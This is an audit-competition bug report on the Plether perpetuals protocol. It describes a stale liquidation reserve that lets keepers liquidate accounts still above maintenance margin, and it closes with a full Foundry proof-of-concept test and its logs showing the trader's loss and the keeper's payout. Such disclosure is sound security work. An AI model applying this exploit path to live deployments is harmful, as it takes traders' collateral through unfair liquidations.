# \#99831 [SC-Medium] After a trader adds to a position at a lower price, a keeper can liquidate the account while it is still above maintenance and take the liquidation charge

**Submitted on Nov 15th 2026 at 12:38:27 UTC by @Audittens for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99831
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
On every open or increase the engine recomputes the liquidation reserve target for the whole resulting position (0.1% of its notional at the execution price). If the new target is lower than the current reserve, the planner keeps the old reserve and does not move the difference to the PnL pledge. This happens when a trader adds to a position after the price has fallen. The spec says that after an increase the reserve equals the target and that collateral beyond the target is PnL pledge. Liquidation health counts the pledge and not the reserve, so the account is treated as liquidatable while its real collateral is still above the maintenance margin. Any keeper can then liquidate it and is paid half of the liquidation charge. In the PoC a 10,000,000 USDG position is liquidated with 10,480 USDG of equity against a 10,032 USDG maintenance margin. The trader ends 10,988 USDG worse off than by closing at the same price, and the keeper is paid 5,000 USDG.

## Vulnerability Details
`OpenAccountingLib.tryBuildOpenState` computes the target for the resulting position:

```
liquidationReserveTargetAssets = max(newLots * price * bountyBps / 10_000, minBountyAssets)
```

`CfdEnginePlanLib._planOpenReserveFunding` then refuses to lower the reserve:

```solidity
delta.liquidationReserveBeforeAssets = snap.liquidationReserveAssets;
delta.liquidationReserveAfterAssets = delta.openState.liquidationReserveTargetAssets;
if (delta.liquidationReserveAfterAssets < delta.liquidationReserveBeforeAssets) {
    delta.liquidationReserveAfterAssets = delta.liquidationReserveBeforeAssets;
}
```

`CfdEngineSettlementSidecar.executeOpen` only moves pledge into the reserve when the reserve grows, and `MarginClearinghouse` has no function that moves liquidation reserve back to the pledge. So after an increase at a lower notional the excess `X = oldReserve - newTarget` stays in the reserve.

ACCOUNTING_SPEC.md describes a different result:

> After an open/increase, the target liquidation reserve is `max(minBountyAssets, floor(resultingNotionalAssets * bountyBps / 10_000))`. Approved position collateral beyond that target is PnL pledge. A reduction recomputes the target and releases excess reserve; price movement alone never permits a liquidation charge to consume PnL pledge.

Other paths do follow this rule. The same `executeOpen` releases the VPI reserve when its target falls, and close planning recomputes the liquidation reserve target and releases the excess.

The excess matters in two places:

* Liquidation health uses only `pledge + same-account claim + PnL` (`planLiquidation`). The reserve is not counted, so the account's equity is understated by `X`. In a price band `X / notional` wide, the account is liquidatable although its collateral, counted as the spec says, is above the maintenance margin.
* The liquidation charge is `0.1% of notional at the liquidation price`, capped by the reserve. With the stale reserve the cap is `X` higher, so the charge takes collateral that the spec says is pledge.

`OrderRouter.executeLiquidation` is permissionless, and the keeper receives `keeperShareBps` of the charge, 50% at release.

### Example (release parameters: `bountyBps = 10`, `maintMarginBps = 10`, `keeperShareBps = 5000`)
1. A trader opens LONG 10,000,000 USDG at 1.00. The reserve is 10,000 USDG.
2. The price falls to 0.95 and the trader adds 11 lots. The target for the new notional (9,501,045) is 9,501 USDG, but the reserve stays 10,000 and the pledge does not get the difference. `X` = 498.96 USDG.
3. The price rises to 1.003096. The engine counts 9,981 USDG of equity against a 10,032 USDG maintenance margin and treats the account as liquidatable. With the 498.96 USDG as pledge, as the spec says, equity is 10,480 USDG and the account is above maintenance.
4. A keeper calls `executeLiquidation`. The charge is the whole 10,000 USDG reserve: 5,000 to the keeper and 5,000 to LPs. The trader is left with 49,980 USDG. Closing the position itself at the same price would have left 60,968 USDG.

## Impact Details
A trader who adds to a position after the price has fallen can be liquidated while the account is above the maintenance margin under the documented accounting. The liquidation takes the liquidation charge from the trader's collateral and pays half of it to whoever calls it. In the PoC the trader loses 10,988 USDG compared with closing at the same price, on a 10,000,000 USDG position, and the keeper is paid 5,000 USDG for one transaction.

* No attacker has to set anything up: the trader's own increase creates the state, and keepers liquidate as soon as the engine allows it.
* The band in which the liquidation is early is `X / notional` wide, with `X = 0.1% * (notional the reserve was sized at - new notional)`. It is about 0.45 bps of price after the 5% fall in the example and grows with the fall: after a 20% fall it is about 2.5 bps, and after a 50% fall it is 10 bps, as wide as the whole maintenance margin.
* If the price keeps moving against the trader past the band, the account would have been liquidated a little later anyway. The trader then still pays `X` more than the spec allows, because the charge takes the whole old reserve: 10,000 USDG instead of 9,501 USDG in the example.
* The condition is an increase at a lower price than the one the reserve was sized at. For a LONG this is adding to a position in profit.

## References
* `_planOpenReserveFunding` keeps `max(target, before)`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L546-L581
* Reserve target for the resulting position: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/OpenAccountingLib.sol#L141-L152
* `executeOpen` only moves pledge to reserve: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L480-L484
* Close planning releases the excess: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L865-L875
* Liquidation equity excludes the reserve, charge is capped by it: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1452-L1502
* Charge and keeper share: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/LiquidationAccountingLib.sol#L62-L80
* Spec: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L806-L813

## Proof of Concept

The following PoC runs the example with release risk parameters and a 100,000,000 USDG pool. It opens the position and adds 11 lots at 0.95 through `OrderRouter.commitOrder` and `OrderRouter.executeOrder`, finds the first price at which the engine treats the account as liquidatable, and checks that the account is above maintenance there once the excess reserve is counted as pledge. From a snapshot it first lets the trader close the position itself at that price, then reverts and lets a keeper liquidate through `OrderRouter.executeLiquidation` (with a mocked Pyth update), so the two results can be compared.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console} from "forge-std/console.sol";

contract PoC_StaleLiquidationReserve is BasePerpTest {

    address trader = makeAddr("trader");
    address keeper = makeAddr("keeper"); // liquidates in step 4
    address orderKeeper = makeAddr("orderKeeper"); // executes the trader's orders

    uint256 constant SIZE = 10_000_000e18; // 100,000 lots, 10,000,000 USDG notional at 1.00
    uint256 constant ADD_SIZE = 1100e18; // 11 lots
    uint256 constant DIP_PRICE = 0.95e8;

    // Release parameters from packages/perps/DEPLOYMENT.md (bountyBps = 10 -> liquidation reserve 0.1% of notional).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 100_000_000e6;
    }

    function test_accountAboveMaintenanceIsLiquidatedAfterIncreaseAtLowerPrice() public {
        _fundTrader(trader, 100_000e6);

        // 1. The trader opens LONG 10,000,000 at 1.00. The liquidation reserve is 0.1% of the notional.
        _trade(SIZE, 60_000e6, false, 1e8);
        console.log("1. reserve after the open at 1.00:          %s", _reserve() / 1e6);

        // 2. The price falls to 0.95 and the trader adds 11 lots. The reserve target for the new notional is lower,
        //    but the reserve is not reduced and the excess does not become pledge.
        router.updateMarkPrice(_mockPythUpdateData(DIP_PRICE));
        _trade(ADD_SIZE, 0, false, DIP_PRICE);
        uint256 specTarget = (SIZE + ADD_SIZE) / 1e20 * DIP_PRICE * 10 / 10_000;
        uint256 excess = _reserve() - specTarget;
        console.log("2. reserve after the increase at 0.95:      %s", _reserve() / 1e6);
        console.log("   reserve target for the new notional:     %s", specTarget / 1e6);
        console.log("   excess that should be pledge:            %s", excess / 1e6);

        // 3. The price rises again. Find the first price at which the engine treats the account as liquidatable.
        uint256 low = DIP_PRICE;
        uint256 high = CAP_PRICE;
        while (low < high) {
            uint256 mid = (low + high) / 2;
            if (engineLens.previewLiquidation(trader, mid).liquidatable) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }
        low += 500; // 0.000005 above the threshold
        ICfdEngineTypes.LiquidationPreview memory preview = engineLens.previewLiquidation(trader, low);
        uint256 maintenance = (SIZE + ADD_SIZE) / 1e20 * low * 10 / 10_000;
        console.log("3. liquidation price (8 decimals):          %s", low);
        console.log("   maintenance margin:                      %s", maintenance / 1e6);
        console.log("   equity the engine counts:                %s", uint256(preview.equityAssets) / 1e6);
        console.log("   equity with the excess as pledge:        %s", (uint256(preview.equityAssets) + excess) / 1e6);
        assertGt(uint256(preview.equityAssets) + excess, maintenance, "above maintenance if the excess were pledge");

        // For comparison: the trader closes the position itself at this price.
        uint256 snapshot = vm.snapshotState();
        _trade(SIZE + ADD_SIZE, 0, true, low);
        uint256 traderIfClosed = clearinghouse.balanceAssets(trader);
        vm.revertToState(snapshot);

        // 4. A keeper liquidates the account at this price and is paid half of the charge.
        _mockPythUpdateData(low);
        bytes[] memory liquidationData = _livePriceData(low);
        vm.prank(keeper);
        router.executeLiquidation(trader, liquidationData);
        (uint256 size,,,,,,) = engine.positions(trader);
        assertEq(size, 0, "liquidated");
        uint256 traderAfter = clearinghouse.balanceAssets(trader);

        console.log("4. liquidation charge:                      %s", preview.liquidationChargeAssets / 1e6);
        console.log("   paid to the keeper:                      %s", clearinghouse.balanceAssets(keeper) / 1e6);
        console.log("   trader's balance after the liquidation:  %s", traderAfter / 1e6);
        console.log("   trader's balance if it closed itself:    %s", traderIfClosed / 1e6);
        console.log("   trader's loss from the liquidation:      %s", (traderIfClosed - traderAfter) / 1e6);
        assertEq(preview.liquidationChargeAssets, specTarget + excess, "the whole old reserve is charged");
    }

    /// The trader commits a LONG open or close through `OrderRouter.commitOrder` and a keeper executes it through
    /// `OrderRouter.executeOrder` at `price`. Only the Pyth update is mocked.
    function _trade(
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("poc", router.nextCommitId())),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory priceData = _mockPythUpdateData(price);
        vm.prank(orderKeeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, priceData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executes");
    }

    function _reserve() internal view returns (uint256) {
        return clearinghouse.liquidationReserveAssets(trader);
    }

    /// Mock Pyth payload with the current price of every feed (Pyth is out of scope).
    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}
```

Save this code to the file `packages/perps/test/perps/poc/PoC_StaleLiquidationReserve.t.sol` and run `forge test --root packages/perps --mc PoC_StaleLiquidationReserve -vv`. It will print the following logs (whole USDG, the price with 8 decimals):

```
Ran 1 test for test/perps/poc/PoC_StaleLiquidationReserve.t.sol:PoC_StaleLiquidationReserve
[PASS] test_accountAboveMaintenanceIsLiquidatedAfterIncreaseAtLowerPrice() (gas: 9154284)
Logs:
  1. reserve after the open at 1.00:          10000
  2. reserve after the increase at 0.95:      10000
     reserve target for the new notional:     9501
     excess that should be pledge:            498
  3. liquidation price (8 decimals):          100309597
     maintenance margin:                      10032
     equity the engine counts:                9981
     equity with the excess as pledge:        10480
  4. liquidation charge:                      10000
     paid to the keeper:                      5000
     trader's balance after the liquidation:  49980
     trader's balance if it closed itself:    60968
     trader's loss from the liquidation:      10988

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 88.11ms (63.79ms CPU time)
```

The engine counts 9,981 USDG of equity against a 10,032 USDG maintenance margin, but with the 498 USDG excess counted as pledge the equity is 10,480 USDG and the liquidation would revert. The keeper is paid 5,000 USDG, and the trader ends with 49,980 USDG instead of the 60,968 USDG it would have after closing at the same price.
